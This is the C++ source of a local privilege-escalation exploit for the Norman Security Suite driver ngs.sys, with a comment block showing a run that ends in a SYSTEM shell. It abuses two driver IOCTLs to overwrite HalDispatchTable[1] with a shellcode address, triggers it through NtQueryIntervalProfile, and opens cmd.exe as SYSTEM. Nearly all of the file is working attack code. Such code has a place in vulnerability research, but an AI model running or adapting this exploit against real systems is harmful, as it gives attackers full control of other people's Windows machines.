//
// Exploit for Norman General Security Driver (ngs.sys / ngs64.sys)
// version 5.0.740.0
//
// Affected Product: Norman Security Suite 10.1
//

/*
------------------------------------------------------------------------
C:\Users\user\Desktop> exploit_ngs.exe
[*] Exploit Norman General Security Driver (ngs.sys / ngs64.sys)
[*] Target file version: ver 5.0.740.0.
[*] An address file was created at C:\Users\user\Desktop\address.bin.
[*] Shellcode is located at 000000013F9357D0.
[*] The device was opened as 0000000000000044.
[*] The address file was opened as FFFFFFFF80000558.
[+] HalDispatchTable[1] is located at FFFFF800033FDC68.
[+] HalDispatchTable[1] was altered.
[+] Shellcode was executed.
[+] The SYSTEM shell was launched.
[*] Press any key to finish this program.

------------------------------------------------------------------------
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user\Desktop>whoami
nt authority\system

*/


// C/C++ standard headers
#include <cstdint>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <memory>


// Other external headers
// Windows headers
#include <tchar.h>
#include <Windows.h>
#include <WinIoCtl.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


// Original headers


////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//


////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//


////////////////////////////////////////////////////////////////////////////////
//
// types
//


////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

EXTERN_C void __stdcall ShellCode();

std::wstring CreateAddressFilePath();

bool CreateAddressFile(
    const std::wstring& FilePath);

bool ExploitNGS(
    const std::wstring& AddressFilePath);

void* OpenKernelFileHandle(
    HANDLE DeviceHandle,
    const std::wstring& FilePath);

bool OverwriteHalDispatchTable(
    HANDLE DeviceHandle,
    void* FileHandle);

void* GetKernelSymbolAddress(
    const std::string& SymbolName);

bool ExecuteShellCode();

bool LaunchCMD();


////////////////////////////////////////////////////////////////////////////////
//
// variables
//


////////////////////////////////////////////////////////////////////////////////
//
// implementations
//


template<class T, class D> inline
std::unique_ptr<T, D> make_unique_ex(
    T* p,
    D d = D())
{
    return std::unique_ptr<T, D>(p, std::forward<D>(d));
}


int _tmain()
{
    printf("[*] Exploit Norman General Security Driver (ngs.sys / ngs64.sys)\n");
    printf("[*] Target file version: ver 5.0.740.0.\n");
    const auto addressFilePath = CreateAddressFilePath();
    if (!CreateAddressFile(addressFilePath))
    {
        return EXIT_FAILURE;
    }
    if (!ExploitNGS(addressFilePath))
    {
        return EXIT_FAILURE;
    }
    printf("[*] Press any key to finish this program.\n");
    ::getchar();
    return EXIT_SUCCESS;
}


// Creates an address file path with the current directory.
std::wstring CreateAddressFilePath()
{
    const std::wstring ADDRESS_FILE_NAME = L"\\address.bin";
    wchar_t currentDir[MAX_PATH];
    ::GetCurrentDirectoryW(_countof(currentDir), currentDir);
    const std::wstring addressFilePath = currentDir + ADDRESS_FILE_NAME;
    return addressFilePath;
}


// Creates an address file with an address of shellcode.
bool CreateAddressFile(
    const std::wstring& FilePath)
{
    std::ofstream addressFile(FilePath, std::ios::binary);
    if (!addressFile)
    {
        printf("[-] std::ofstream() failed.\n");
        return false;
    }

    // Write an address of shellcode to the address file
    void* addr = &ShellCode;
    addressFile.write(reinterpret_cast<char*>(&addr), sizeof(addr));
    if (!addressFile.good())
    {
        printf("[-] write() failed.\n");
        return false;
    }

    printf("[*] An address file was created at %S.\n", FilePath.c_str());
    printf("[*] Shellcode is located at %p.\n", addr);
    return true;
}


// Exploits the vulnerability by shellcode that escalates a privilege of this
// process.
bool ExploitNGS(
    const std::wstring& AddressFilePath)
{
    const auto deviceHandle = make_unique_ex(::CreateFile(
        TEXT("\\\\.\\ngs"),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr), 
        ::CloseHandle);
    if (deviceHandle.get() == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile() failed.\n");
        return false;
    }
    printf("[*] The device was opened as %p.\n", deviceHandle.get());

    // Open an address file that contains an address of shellcode.
    const auto fileHandle = OpenKernelFileHandle(
        deviceHandle.get(), AddressFilePath);
    if (!fileHandle)
    {
        printf("[-] OpenKernelHandle() failed.\n");
        return false;
    }
    printf("[*] The address file was opened as %p.\n", fileHandle);

    // Overwrites HalDispatchTable[1] by an address of shellcode.
    if (!OverwriteHalDispatchTable(deviceHandle.get(), fileHandle))
    {
        printf("[-] OverwriteHalDispatchTable() failed.\n");
        return false;
    }
    printf("[+] HalDispatchTable[1] was altered.\n");

    // Execute shellcode to escalate a privilege of this process to SYSTEM.
    if (!ExecuteShellCode())
    {
        return false;
    }
    printf("[+] Shellcode was executed.\n");

    // Create a SYSTEM shell.
    if (!LaunchCMD())
    {
        return false;
    }
    printf("[+] The SYSTEM shell was launched.\n");
    return true;
}


// Opens kernel file handle using IOCTL 0x220086. Note that this handle cannot
// use and close in user-mode.
void* OpenKernelFileHandle(
    HANDLE DeviceHandle,
    const std::wstring& FilePath)
{
    // Create an NT-style file path for the address file.
    const std::wstring ntFilePath = L"\\??\\" + FilePath;
    std::vector<wchar_t> path(::wcslen(ntFilePath.c_str()) + 1);
    std::copy(ntFilePath.cbegin(), ntFilePath.cend(), path.begin());

    // Obtain an address file handle.
    uint32_t kernelHandle = 0;
    DWORD returned = 0;
    ::DeviceIoControl(
        DeviceHandle, 0x220086,
        &path[0],
        static_cast<DWORD>(path.size() * sizeof(wchar_t)),
        &kernelHandle, sizeof(kernelHandle),
        &returned, nullptr);
    
    // In order to be correct file handle on x64, you need to give the value.
    return reinterpret_cast<void*>(0xffffffff00000000 | kernelHandle);
}


// Alterers HalDispatchTable[1] using IOCTL 0x220092.
bool OverwriteHalDispatchTable(
    HANDLE DeviceHandle,
    void* FileHandle)
{
    #pragma pack(push, 4)
    struct ReadFileCommandParameter
    {
        uint32_t unknown;
        void* destBuffer;
        uint32_t copySize;
        size_t copiedSize;
    };
    #pragma pack(pop)

    const auto HalDispatchTablePtr = reinterpret_cast<unsigned char*>(
        GetKernelSymbolAddress("HalDispatchTable"));
    if (!HalDispatchTablePtr)
    {
        return false;
    }

    ReadFileCommandParameter parameter =
    {
        0,
        // It indicates the address which is overwritten with the contents of 
        // the address file given as a handle by ngs.sys. 
        (HalDispatchTablePtr + sizeof(void*)), // HalDispatchTable[1]
        sizeof(void*),
        0,
    };
    printf("[+] HalDispatchTable[1] is located at %p.\n", parameter.destBuffer);

    DWORD returned = 0;
    const auto succeed = ::DeviceIoControl(
        DeviceHandle, 0x220092,
        &FileHandle, sizeof(FileHandle),
        &parameter, sizeof(parameter),
        &returned, nullptr);
    if (!succeed)
    {
        printf("[-] DeviceIoControl(0x220092) failed.\n");
        return false;
    }
    return true;
}


// GetProcAddress for kernel.
void* GetKernelSymbolAddress(
    const std::string& SymbolName)
{
    typedef enum _SYSTEM_INFORMATION_CLASS
    {
        SystemModuleInformation = 11
    } SYSTEM_INFORMATION_CLASS;

    typedef NTSTATUS(NTAPI*NtQuerySystemInformationType)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);

    typedef struct
    {
        PVOID   Unknown1;
        PVOID   Unknown2;
        PVOID   Base;
        ULONG   Size;
        ULONG   Flags;
        USHORT  Index;
        USHORT  NameLength;
        USHORT  LoadCount;
        USHORT  PathLength;
        CHAR    ImageName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

    typedef struct
    {
        ULONG   Count;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


    const auto NtQuerySystemInformationPtr =
        reinterpret_cast<NtQuerySystemInformationType>(::GetProcAddress(
        ::GetModuleHandle(TEXT("ntdll.dll")), "NtQuerySystemInformation"));
    if (!NtQuerySystemInformationPtr)
    {
        return nullptr;
    }

    // Get a size of SYSTEM_MODULE_INFORMATION.
    ULONG infoSize = 0;
    auto status = NtQuerySystemInformationPtr(
        SystemModuleInformation, nullptr, 0, &infoSize);
    if (infoSize == 0)
    {
        return nullptr;
    }

    // Get SYSTEM_MODULE_INFORMATION.
    std::vector<char> infoBuffer(infoSize);
    status = NtQuerySystemInformationPtr(
        SystemModuleInformation, &infoBuffer[0], infoSize, &infoSize);
    if (status != 0/*STATUS_SUCCESS*/)
    {
        return nullptr;
    }

    const auto info = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>(
        &infoBuffer[0]);

    // Acquire the address of the symbol in this process.
    const auto kernelName = ::PathFindFileNameA(info->Module[0].ImageName);
    const auto ntosHandle = ::LoadLibraryA(kernelName);
    if (!ntosHandle)
    {
        return nullptr;
    }

    const auto symbol = reinterpret_cast<unsigned char*>(
        ::GetProcAddress(ntosHandle, SymbolName.c_str()));
    ::FreeLibrary(ntosHandle);
    if (!symbol)
    {
        return nullptr;
    }

    // Calculate the address of the symbol in kernel.
    const auto kernelBase = reinterpret_cast<unsigned char*>(
        info->Module[0].Base);
    return symbol - reinterpret_cast<unsigned char*>(ntosHandle)+kernelBase;
}


// Executes HalDisapatchTable[1] via NtQueryIntervalProfile()
bool ExecuteShellCode()
{
    typedef NTSTATUS(NTAPI*NtQueryIntervalProfileType)(
        DWORD ProfileSource,
        PULONG Interval);

    const auto NtQueryIntervalProfilePtr =
        reinterpret_cast<NtQueryIntervalProfileType>(::GetProcAddress(
        ::GetModuleHandle(TEXT("ntdll.dll")), "NtQueryIntervalProfile"));
    if (!NtQueryIntervalProfilePtr)
    {
        printf("[-] GetProcAddress() failed.\n");
        return false;
    }

    ULONG dummy = 0;
    NtQueryIntervalProfilePtr(2, &dummy);
    return true;
}


// Launches a command shell process.
bool LaunchCMD()
{
    TCHAR cmd[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };
    if (!::CreateProcess(cmd, cmd, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi))
    {
        printf("[-] CreateProcess() failed.\n");
        return false;
    }

    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);
    return true;
}

